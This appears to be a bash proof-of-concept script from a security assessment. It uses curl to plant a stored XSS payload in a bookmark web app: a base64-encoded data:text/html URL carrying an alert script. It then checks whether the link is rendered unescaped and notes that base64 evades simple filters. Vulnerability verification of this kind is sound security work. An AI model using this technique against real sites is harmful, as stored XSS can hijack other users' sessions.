#!/bin/bash

# POC: Stored XSS via data: URL in Bookmark Field
# This script demonstrates the stored XSS vulnerability where data: URLs
# with Base64 encoded JavaScript are stored unescaped in bookmark href attributes

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT_ADD="${TARGET_URL}/add"
ENDPOINT_LIST="${TARGET_URL}/list"

echo "[*] Stored XSS via data: URL POC"
echo "[*] Target: ${TARGET_URL}"
echo ""

# Step 1: Create a Base64 encoded JavaScript payload
# Original: <script>alert('XSS via data URL')</script>
PAYLOAD="PHNjcmlwdD5hbGVydCgnWFNTIHZpYSBkYXRhIFVSTCcpPC9zY3JpcHQ+"
DATA_URL="data:text/html;base64,${PAYLOAD}"

echo "[*] Step 1: Create Base64 encoded data: URL payload"
echo "[+] Base64 Payload: ${PAYLOAD}"
echo "[+] Data URL: ${DATA_URL}"
echo ""

# Step 2: First, get a session by visiting /list to establish cookies
echo "[*] Step 2: Establish session"
INIT_RESPONSE=$(curl -s -X GET \
  "${ENDPOINT_LIST}" \
  -c /tmp/cookies_data_url.txt)
echo "[+] Session established"
echo ""

# Step 3: Send POST request to add bookmark with data: URL
echo "[*] Step 3: Add bookmark with data: URL via POST"
ADD_RESPONSE=$(curl -s -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  "${ENDPOINT_ADD}" \
  -d "name=XSSTest&url=${DATA_URL}" \
  -b /tmp/cookies_data_url.txt \
  -c /tmp/cookies_data_url.txt)

echo "[+] Post response: ${ADD_RESPONSE}"
echo ""

# Step 4: Retrieve list to check if data: URL is stored unescaped
echo "[*] Step 4: Retrieve bookmark list and verify data: URL encoding"
LIST_RESPONSE=$(curl -s -X GET \
  "${ENDPOINT_LIST}" \
  -b /tmp/cookies_data_url.txt)

echo "[+] List response:"
echo "${LIST_RESPONSE}"
echo ""

# Step 5: Check if the data: URL appears unescaped in href attribute
if echo "${LIST_RESPONSE}" | grep -q 'href="data:text/html;base64'; then
    echo "[+] SUCCESS: data: URL found unescaped in href attribute!"
    echo "[+] VULNERABILITY CONFIRMED: Stored XSS via data: URL"
    echo ""
    
    # Extract the actual href value
    HREF_VALUE=$(echo "${LIST_RESPONSE}" | grep -oP 'href="\K[^"]*' | grep "data:" | head -1)
    echo "[+] Extracted href value: ${HREF_VALUE}"
    echo ""
    
    # Verify it's the data URL we sent
    if echo "${HREF_VALUE}" | grep -q "data:text/html;base64"; then
        echo "[+] Confirmed: The data: URL is stored and rendered without encoding"
        echo "[+] This allows JavaScript execution when the link is clicked"
        echo "[+] Base64 bypasses simple string-based filters"
        exit 0
    fi
elif echo "${LIST_RESPONSE}" | grep -q 'href="data%3Atext'; then
    echo "[-] data: URL appears to be URL-encoded (href-safe)"
    echo "[-] Vulnerability appears to be mitigated"
    exit 1
elif echo "${LIST_RESPONSE}" | grep -i "XSSTest" | grep -q "href"; then
    echo "[*] Bookmark found, checking encoding..."
    HREF_LINE=$(echo "${LIST_RESPONSE}" | grep -i "XSSTest" | head -1)
    echo "[+] Bookmark line: ${HREF_LINE}"
    
    if echo "${HREF_LINE}" | grep -q 'href="data:text/html;base64'; then
        echo "[+] SUCCESS: data: URL found unescaped!"
        exit 0
    elif echo "${HREF_LINE}" | grep -q 'href="data%3A'; then
        echo "[-] URL is encoded - vulnerability mitigated"
        exit 1
    fi
else
    echo "[-] Bookmark not found in response"
    echo "[-] This may indicate the vulnerability is fixed or cookies not working"
    exit 1
fi